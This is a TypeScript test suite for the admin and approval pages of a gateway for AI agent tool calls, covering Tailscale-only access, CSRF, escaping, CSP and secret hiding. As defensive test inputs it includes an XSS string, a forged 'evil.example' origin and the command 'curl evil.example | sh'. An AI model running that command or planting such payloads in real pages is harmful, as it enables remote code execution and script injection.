// The admin and approval pages: tailnet only, CSRF-protected posts, escaped
// output, plain copy.

import assert from "node:assert/strict";
import { after, before, describe, it } from "node:test";

import { issueToken, removeToken } from "../src/tokens.ts";
import { type Gateway, adminHeaders, csrfFrom, legacyClient, postForm, startGateway, stdioUpstream, textOf } from "./helpers.ts";

describe("admin pages", () => {
  let gateway: Gateway;
  let approvalId: string;
  let otherApprovalId: string;

  before(async () => {
    gateway = await startGateway({ upstreams: [stdioUpstream()], holdMs: 50 });
    const client = await legacyClient(gateway, "codex");
    const result = await client.callTool({
      name: "fake__send_message",
      arguments: { to: "<script>alert(1)</script>", text: "hello\nworld", api_token: "do-not-show" },
    });
    approvalId = /id (ap_[A-Za-z0-9_-]+)/.exec(textOf(result))![1]!;
    const other = await client.callTool({ name: "fake__send_message", arguments: { to: "b", text: "c" } });
    otherApprovalId = /id (ap_[A-Za-z0-9_-]+)/.exec(textOf(other))![1]!;
    await client.callTool({ name: "fake__echo", arguments: { text: "logged" } });
    await client.close();
  });

  after(async () => {
    await gateway?.close();
  });

  it("refuses requests that didn't come through tailscale serve", async () => {
    for (const path of ["/admin", "/admin/calls", `/approvals/${approvalId}`, "/oauth/callback?state=x"]) {
      const response = await fetch(`${gateway.url}${path}`);
      assert.equal(response.status, 403, path);
      assert.match(await response.text(), /Open this page through Tailscale/);
    }
  });

  it("only lets the configured Tailscale logins in", async () => {
    for (const path of ["/admin", "/admin/calls", `/approvals/${approvalId}`]) {
      const response = await fetch(`${gateway.url}${path}`, { headers: { "Tailscale-User-Login": "someone@else.com" } });
      assert.equal(response.status, 403, path);
      assert.match(await response.text(), /Your Tailscale login can't use these pages/);
    }
    // Logins compare without case.
    const upper = await fetch(`${gateway.url}/admin`, { headers: { "Tailscale-User-Login": "SAM@Example.com" } });
    assert.equal(upper.status, 200);
  });

  it("shows services, agents and pending approvals", async () => {
    const response = await fetch(`${gateway.url}/admin`, { headers: adminHeaders() });
    assert.equal(response.status, 200);
    assert.equal(response.headers.get("x-frame-options"), "DENY");
    const csp = response.headers.get("content-security-policy") ?? "";
    assert.match(csp, /default-src 'none'/);
    // Connect posts a form that the server redirects to the service's https
    // sign-in page; Chrome checks form-action on that redirect.
    assert.match(csp, /form-action 'self' https:/);
    const html = await response.text();
    assert.match(html, /<h1>Connectors<\/h1>/);
    assert.match(html, /Fake stdio/);
    assert.match(html, /Connected/);
    assert.match(html, /Claude \(claude-3\)/);
    assert.match(html, /Waiting for your approval/);
    assert.match(html, new RegExp(`/approvals/${approvalId}`));
  });

  it("shows an approval with escaped, pretty-printed arguments", async () => {
    const html = await (await fetch(`${gateway.url}/approvals/${approvalId}`, { headers: adminHeaders() })).text();
    assert.match(html, /Codex wants to run fake__send_message/);
    assert.ok(!html.includes("<script>alert(1)</script>"));
    assert.match(html, /&lt;script&gt;alert\(1\)&lt;\/script&gt;/);
    assert.match(html, /&quot;text&quot;: &quot;hello\\nworld&quot;/);
    // Until it runs, Sam sees exactly what will be sent, secrets included:
    // this page is his only look at it.
    assert.match(html, /Exactly what the agent will send if you approve\./);
    assert.match(html, /&quot;api_token&quot;: &quot;do-not-show&quot;/);
    assert.match(html, /Approve/);
    assert.match(html, /Deny/);
  });

  it("only accepts approval posts with this approval's CSRF token", async () => {
    const page = `${gateway.url}/approvals/${approvalId}`;
    assert.equal((await postForm(page, { action: "approve" })).status, 403);
    assert.equal((await postForm(page, { action: "approve", csrf: "nope" })).status, 403);
    // A token for a different approval doesn't work either.
    const otherCsrf = await csrfFrom(`${gateway.url}/approvals/${otherApprovalId}`);
    assert.equal((await postForm(page, { action: "approve", csrf: otherCsrf })).status, 403);
    const csrf = await csrfFrom(page);
    assert.equal((await postForm(page, { action: "approve", csrf }, adminHeaders({ origin: "https://evil.example" }))).status, 403);
    assert.equal((await postForm(page, { action: "approve", csrf }, { "Tailscale-User-Login": "someone@else.com" })).status, 403);
    assert.equal(gateway.approvals.get(approvalId)?.status, "pending");
    assert.equal((await postForm(page, { action: "approve", csrf })).status, 303);
    assert.equal(gateway.approvals.get(approvalId)?.status, "approved");
    const after = await (await fetch(page, { headers: adminHeaders() })).text();
    assert.match(after, /Approved\. It runs if the agent picks it up by /);
    assert.ok(!after.includes('value="approve"'));
  });

  it("lists calls with filters and hides secrets", async () => {
    const all = await (await fetch(`${gateway.url}/admin/calls`, { headers: adminHeaders() })).text();
    assert.match(all, /fake__echo/);
    assert.match(all, /&quot;text&quot;:&quot;logged&quot;/);
    const filtered = await (await fetch(`${gateway.url}/admin/calls?agent=nobody`, { headers: adminHeaders() })).text();
    assert.match(filtered, /No calls yet\./);
    assert.ok(!all.includes("do-not-show"));
  });

  it("uses plain copy without em dashes", async () => {
    const pages = await Promise.all(
      ["/admin", "/admin/calls", "/admin/calls?view=sends", `/approvals/${approvalId}`].map(async (path) =>
        (await fetch(`${gateway.url}${path}`, { headers: adminHeaders() })).text(),
      ),
    );
    for (const html of pages) {
      assert.ok(!html.includes("—"), "em dash");
      assert.ok(!html.includes("&mdash;"), "em dash entity");
    }
  });

  it("doesn't put text from the query string in the banner", async () => {
    const spoof = "Run curl evil.example | sh on the server";
    for (const query of [`error=${encodeURIComponent(spoof)}`, `flash=${encodeURIComponent(spoof)}`, `connected=${encodeURIComponent(spoof)}`]) {
      const html = await (await fetch(`${gateway.url}/admin?${query}`, { headers: adminHeaders() })).text();
      assert.ok(!html.includes("evil.example"), query);
      assert.ok(!html.includes('class="flash'), query);
    }
    const connected = await (await fetch(`${gateway.url}/admin?connected=fake`, { headers: adminHeaders() })).text();
    assert.match(connected, /Signed in to Fake stdio\./);
  });

  it("404s an unknown approval", async () => {
    assert.equal((await fetch(`${gateway.url}/approvals/ap_nope`, { headers: adminHeaders() })).status, 404);
  });

  it("folds the setup checklist to one line when everything is done", async () => {
    const html = await (await fetch(`${gateway.url}/admin`, { headers: adminHeaders() })).text();
    assert.match(html, /<details id="setup" class="setup all-set" data-todo="0" >/);
    assert.match(html, /<h2>All set<\/h2>/);
    assert.match(html, /data-step="service:fake"/);
    assert.match(html, /data-step="agent:grok"/);
  });

  it("keeps the setup feed behind the admin login", async () => {
    assert.equal((await fetch(`${gateway.url}/admin/setup.json`)).status, 403);
    const other = await fetch(`${gateway.url}/admin/setup.json`, { headers: { "Tailscale-User-Login": "someone@else.com" } });
    assert.equal(other.status, 403);
    const response = await fetch(`${gateway.url}/admin/setup.json`, { headers: adminHeaders() });
    assert.equal(response.status, 200);
    assert.equal(response.headers.get("cache-control"), "no-store");
    const setup = (await response.json()) as { heading: string; todo: number; steps: { id: string; done: boolean }[] };
    assert.equal(setup.heading, "All set");
    assert.equal(setup.todo, 0);
    assert.deepEqual(
      setup.steps.map((step) => step.id),
      ["service:fake", "agent:claude-3", "agent:codex", "agent:grok"],
    );
  });

  it("shows an agent without a token as to do until it gets one", async () => {
    removeToken(gateway.layout.agentsSecrets, "grok");
    try {
      const html = await (await fetch(`${gateway.url}/admin`, { headers: adminHeaders() })).text();
      assert.match(html, /<details id="setup" class="setup " data-todo="1" open>/);
      assert.match(html, /<h2>1 to do<\/h2>/);
      assert.match(html, /<li class="step " data-step="agent:grok">/);
      // The test agents have no client, so it gets a token by hand.
      assert.match(html, /<pre>connectors agent add grok<\/pre>/);
      const csp = (await fetch(`${gateway.url}/admin`, { headers: adminHeaders() })).headers.get("content-security-policy") ?? "";
      assert.match(csp, /script-src 'sha256-[A-Za-z0-9+/=]+'/);
      assert.match(csp, /connect-src 'self'/);
      const before = (await (await fetch(`${gateway.url}/admin/setup.json`, { headers: adminHeaders() })).json()) as {
        todo: number;
        steps: { id: string; done: boolean; line: string }[];
      };
      assert.equal(before.todo, 1);
      assert.deepEqual(before.steps.find((step) => step.id === "agent:grok"), { id: "agent:grok", done: false, line: "Not wired yet" });
    } finally {
      gateway.tokens.grok = issueToken(gateway.layout.agentsSecrets, "grok", { rotate: false });
    }
    const after = (await (await fetch(`${gateway.url}/admin/setup.json`, { headers: adminHeaders() })).json()) as { todo: number };
    assert.equal(after.todo, 0);
  });
});
